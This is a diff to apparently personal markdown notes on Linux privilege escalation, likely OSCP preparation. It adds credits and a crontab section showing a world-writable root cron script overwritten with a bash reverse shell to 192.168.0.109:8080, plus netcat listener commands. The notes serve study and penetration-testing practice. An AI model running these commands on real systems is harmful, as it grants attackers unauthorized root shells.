@@ -1,8 +1,13 @@
 # Linux Privilege Escalation
 
----- Credits to Touhid M.Shaikh @ https://touhidshaikh.com/blog/?p=790 ----
+---- Credits ----
+Touhid M.Shaikh @ https://touhidshaikh.com/blog/?p=790
+https://www.jpsecnetworks.com/week-8-oscp-preparation-post-exploitation/
+
 ---- Modified to add my own notes and formatting in ----
 
+
+## SUID bit exploitables
 
 Sudoers File
 
@@ -176,6 +181,32 @@ Note: if u want to dump file from a server like a root’s ssh key, Shadow file 
     Setup Listener on attacker : nc –lvp 8080
 
 
+## crontab
+
+By looking at the scheduled cron jobs we can see a script that can be edited using low priv. We can use that to insert a reverse shell code.
+
+    /etc/cron.hourly:
+    total 24
+    drwxr-xr-x 2 root root 4096 out 16 23:21 .
+    drwxr-xr-x 135 root root 12288 out 16 18:41 ..
+    -rwxrwxrwx 1 root root 57 out 16 23:21 getinfo.sh <---
+    -rw-r–r– 1 root root 102 nov 16 2017 .placeholder
+
+
+echo ‘bash -i >& /dev/tcp/192.168.0.109/8080 0>&1’ > getinfo.sh
+
+    cat getinfo.sh
+    #!/bin/bash
+
+    bash -i >& /dev/tcp/192.168.0.109/8080 0>&1
+
+Now we can setup another nc and run the script and wait until the cron job runs. It will run as a root user.
+
+On Kali Linux:
+
+    root@kali:/scripts/privesc# nc -nlvp 8080
+
+
 **Other**
 
 Checking for running services running as root
@@ -206,7 +237,6 @@ Output is like this :
 
 
 Sadly no Shell. But you manage to extract root hash now Crack hash in your machine. For Shadow Cracking click here for more.
-
 
 
 
